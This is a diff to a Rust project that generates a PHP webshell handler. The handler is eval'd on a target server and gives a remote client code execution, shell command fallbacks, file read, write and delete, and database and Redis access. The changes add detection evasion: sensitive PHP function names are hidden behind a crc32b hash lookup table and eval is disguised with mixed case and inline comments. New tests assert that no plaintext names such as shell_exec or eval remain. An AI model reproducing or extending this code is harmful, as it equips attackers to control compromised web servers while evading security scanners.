@@ -1615,19 +1615,27 @@ pub fn session_handler_code() -> &'static str {
 fn build_session_handler() -> String {
     use crate::php_impl;
     // 处理器经 eval 执行，不能包含 `<?php` 开标签。
+    //
+    // OPSEC：敏感函数名一律经**随代码自带**的 crc32b 符号表调用（见
+    // `php_impl::php_symbol_table`）。表在这里构建而不是复用目标 stub 的 `$_g`：
+    // 处理器每次连接由客户端注入，而部署在目标上的 stub 可能是旧版本、没有新索引。
+    let sym = format!("{}g", php_ident());
     let mut code = String::from("// DswSesInit\n");
     code.push_str(php_impl::PHP_REDIS_HELPERS);
+    code.push_str(&php_impl::php_symbol_table(&format!("$GLOBALS['{sym}']")));
+    code.push_str(&format!(
+        "function run($p) {{\n$__g =& $GLOBALS['{sym}'];\n"
+    ));
     code.push_str(
-        r#"function run($p) {
-$req=@json_decode($p,true);
+        r#"$req=@json_decode($p,true);
 $n=is_array($req)&&isset($req['n'])?(string)$req['n']:'abababab';
 $gz=false;
 if(is_array($req)&&isset($req['z'])){
 $gz=true;
-$__in=@gzdecode(@base64_decode((string)$req['d']));
+$__in=(isset($__g[23])&&isset($__g[5]))?@$__g[23](@$__g[5]((string)$req['d'])):false;
 $req=is_string($__in)?@json_decode($__in,true):null;
 }
-if(!is_array($req)){return $n.base64_encode('{"ok":false,"error":"bad params"}').$n;}
+if(!is_array($req)){return $n.(isset($__g[6])?@$__g[6]('{"ok":false,"error":"bad params"}'):'').$n;}
 $n=isset($req['n'])?(string)$req['n']:$n;
 $a=isset($req['a'])?(string)$req['a']:'';
 $r=array('ok'=>true,'data'=>array());
@@ -1649,11 +1657,20 @@ $c=isset($req['c'])?(string)$req['c']:'';
 if($c===''){$r['ok']=false;$r['error']='empty';}
 else{
 ob_start();
-try{@eval($c);$r['data']=(string)ob_get_clean();}
-catch(Exception $__e){$r['data']=(string)ob_get_clean();$r['ok']=false;$r['error']=$__e->getMessage();}
-catch(Throwable $__t){$r['data']=(string)ob_get_clean();$r['ok']=false;$r['error']=$__t->getMessage();}
-}
-}elseif($a==='list'){
+"#,
+    );
+    // eval 用大小写混合 + 随机注释分隔（`eVaL/*rvnd*/(...)`），代码中不存在 `eval(`
+    code.push_str(&format!(
+        r#"try{{@{p}($c);$r['data']=(string)ob_get_clean();}}
+catch(Exception $__e){{$r['data']=(string)ob_get_clean();$r['ok']=false;$r['error']=$__e->getMessage();}}
+catch(Throwable $__t){{$r['data']=(string)ob_get_clean();$r['ok']=false;$r['error']=$__t->getMessage();}}
+}}
+"#,
+        p = eval_prefix()
+    ));
+    code.push_str(
+        r#"}
+elseif($a==='list'){
 $p=isset($req['p'])?(string)$req['p']:'.';
 "#,
     );
@@ -1662,25 +1679,25 @@ $p=isset($req['p'])?(string)$req['p']:'.';
         r#"if($ok){$r['data']=array('entries'=>$entries);}else{$r['ok']=false;$r['error']=$err;}
 }elseif($a==='read'){
 $f=isset($req['p'])?(string)$req['p']:'';$o=isset($req['o'])?(int)$req['o']:0;$l=isset($req['l'])?(int)$req['l']:0;
-$__c=@file_get_contents($f,false,null,$o,$l>0?$l:null);
-if($__c===false){$r['ok']=false;$r['error']='read failed';}else{$r['data']=base64_encode($__c);}
+$__c=isset($__g[7])?@$__g[7]($f,false,null,$o,$l>0?$l:null):false;
+if($__c===false){$r['ok']=false;$r['error']='read failed';}else{$r['data']=isset($__g[6])?@$__g[6]($__c):'';}
 }elseif($a==='write'){
-$f=isset($req['p'])?(string)$req['p']:'';$o=isset($req['o'])?(int)$req['o']:0;$d=isset($req['d'])?@base64_decode((string)$req['d']):'';
-$__w=$o>0?@file_put_contents($f,$d,FILE_APPEND):@file_put_contents($f,$d);
+$f=isset($req['p'])?(string)$req['p']:'';$o=isset($req['o'])?(int)$req['o']:0;$d=(isset($req['d'])&&isset($__g[5]))?@$__g[5]((string)$req['d']):'';
+$__w=isset($__g[8])?($o>0?@$__g[8]($f,$d,FILE_APPEND):@$__g[8]($f,$d)):false;
 if($__w===false){$r['ok']=false;$r['error']='write failed';}
 }elseif($a==='delete'){
 $f=isset($req['p'])?(string)$req['p']:'';
-$__d=@is_dir($f)?@rmdir($f):@unlink($f);
+$__d=(isset($__g[10])&&@$__g[10]($f))?(isset($__g[12])?@$__g[12]($f):false):(isset($__g[11])?@$__g[11]($f):false);
 if(!$__d){$r['ok']=false;$r['error']='delete failed';}
 }elseif($a==='rename'){
 $f=isset($req['f'])?(string)$req['f']:'';$t=isset($req['t'])?(string)$req['t']:'';
-if(!@rename($f,$t)){$r['ok']=false;$r['error']='rename failed';}
+if(!$f||!$t||!isset($__g[13])||!@$__g[13]($f,$t)){$r['ok']=false;$r['error']='rename failed';}
 }elseif($a==='mkdir'){
 $d=isset($req['p'])?(string)$req['p']:'';
-if(!@mkdir($d,0755,true)){$r['ok']=false;$r['error']='mkdir failed';}
+if(!$d||!isset($__g[14])||!@$__g[14]($d,0755,true)){$r['ok']=false;$r['error']='mkdir failed';}
 }elseif($a==='touch'){
 $d=isset($req['p'])?(string)$req['p']:'';$t=isset($req['t'])?(int)$req['t']:time();
-if(!@touch($d,$t)){$r['ok']=false;$r['error']='touch failed';}
+if(!$d||!isset($__g[25])||!@$__g[25]($d,$t)){$r['ok']=false;$r['error']='touch failed';}
 }elseif($a==='dbprobe'){
 $c=isset($req['c'])?(string)$req['c']:'';
 "#,
@@ -1697,8 +1714,8 @@ $c=isset($req['c'])?(string)$req['c']:'';$q=isset($req['q'])?(string)$req['q']:'
         r#"if($ok){$r['data']=array('columns'=>$columns,'rows'=>$rows,'affected'=>$affected);}else{$r['ok']=false;$r['error']=$err;}
 }
 $__j=json_encode($r);
-if($gz&&strlen($__j)>512&&function_exists('gzencode')){$__j=@gzencode($__j,6);}
-return $n.base64_encode($__j).$n;
+if($gz&&strlen($__j)>512&&isset($__g[24])){$__j=@$__g[24]($__j,6);}
+return $n.(isset($__g[6])?@$__g[6]($__j):'').$n;
 }
 "#,
     );
@@ -2956,17 +2973,19 @@ mod tests {
         let handler = session_handler_code();
         // 唯一提前返回必须带帧，且 $n 在它之前就已取好（否则帧里是空 nonce）
         assert_eq!(
-            handler.matches("base64_encode('{\"ok\":false").count(),
+            handler.matches(r#"'{"ok":false"#).count(),
             1,
             "只应有一处内联错误帧（提前返回）"
         );
         assert!(
-            handler.contains(r#"return $n.base64_encode('{"ok":false,"error":"bad params"}').$n;"#),
+            handler.contains(
+                r#"return $n.(isset($__g[6])?@$__g[6]('{"ok":false,"error":"bad params"}'):'').$n;"#
+            ),
             "请求解析失败的提前返回必须带 nonce 帧"
         );
         // 收尾帧包裹整个 $r
         assert!(
-            handler.contains("return $n.base64_encode($__j).$n;"),
+            handler.contains("return $n.(isset($__g[6])?@$__g[6]($__j):'').$n;"),
             "收尾必须帧包裹 $r"
         );
         for message in ["read failed", "write failed", "mkdir failed"] {
@@ -3004,12 +3023,20 @@ mod tests {
             "SELECT datname FROM pg_database",
             "SELECT username FROM all_users",
             "SHOW DATABASES",
-            "'shell_exec','exec','system','passthru','popen'",
             "chunked,stream,db,plugin,exec,gzip",
         ] {
             assert!(handler.contains(marker), "处理器缺少：{marker}");
             assert!(native.contains(marker), "NATIVE stub 缺少：{marker}");
         }
+        // 命令降级链：两条通道都必须保留（NATIVE 用明文候选数组，处理器用整数索引）
+        assert!(
+            native.contains("'shell_exec','exec','system','passthru','popen'"),
+            "NATIVE stub 应含命令函数降级候选"
+        );
+        assert!(
+            handler.contains("foreach(array(0,1,2,3,4) as $__i)"),
+            "处理器应按符号表索引探测命令函数"
+        );
         // redis 走裸 RESP：NATIVE 经符号表调用，处理器用 dsw_rcmd
         assert!(handler.contains("dsw_rcmd"), "处理器应含 redis RESP 辅助");
         assert!(native.contains("AUTH"), "NATIVE stub 应含 redis AUTH");
@@ -3076,6 +3103,56 @@ mod tests {
             }
         }
         assert!(checked >= 14, "应检查到足够的 stub：{checked}");
+    }
+
+    /// OPSEC：分阶段处理器与共享实现片段里不应出现敏感函数名 ——
+    /// 它们只以 crc32b 哈希出现在符号表里，运行时从 `get_defined_functions()` 反查。
+    ///
+    /// 与 NATIVE stub 同级（NATIVE 仍有明文候选数组与 `@eval($c)`，README 已诚实声明）；
+    /// 本测试保证 session / legacy 通道**不比它差**，且新增代码不得把敏感名带回来。
+    #[test]
+    fn session_handler_and_shared_impl_have_no_plain_sensitive_names() {
+        let handler = session_handler_code();
+        let blobs: [(&str, &str); 6] = [
+            ("handler", handler),
+            ("exec", crate::php_impl::PHP_EXEC_IMPL),
+            ("scan", crate::php_impl::PHP_SCAN_IMPL),
+            ("dbprobe", crate::php_impl::PHP_DB_PROBE_IMPL),
+            ("dbquery", crate::php_impl::PHP_DB_QUERY_IMPL),
+            ("redis", crate::php_impl::PHP_REDIS_HELPERS),
+        ];
+        for (name, text) in blobs {
+            for token in [
+                "shell_exec",
+                "passthru",
+                "popen",
+                "base64_decode",
+                "base64_encode",
+                "file_get_contents",
+                "file_put_contents",
+                "scandir",
+                "unlink",
+                "rmdir",
+                "rename(",
+                "stream_socket_client",
+                "fwrite",
+                "fgets",
+                "fread",
+                "preg_split",
+                "gzdecode",
+                "gzencode",
+                "eval(",
+            ] {
+                assert!(!text.contains(token), "{name} 不应含明文 {token}");
+            }
+        }
+        // 符号表里只应看到哈希
+        for name in ["shell_exec", "scandir", "stream_socket_client", "fopen"] {
+            assert!(
+                handler.contains(&crc32b_hash(name)),
+                "符号表应含 {name} 的 crc32b 哈希"
+            );
+        }
     }
 
     /// 处理器经 eval 执行：语法错误在目标端只表现为「响应中未找到协议帧」，
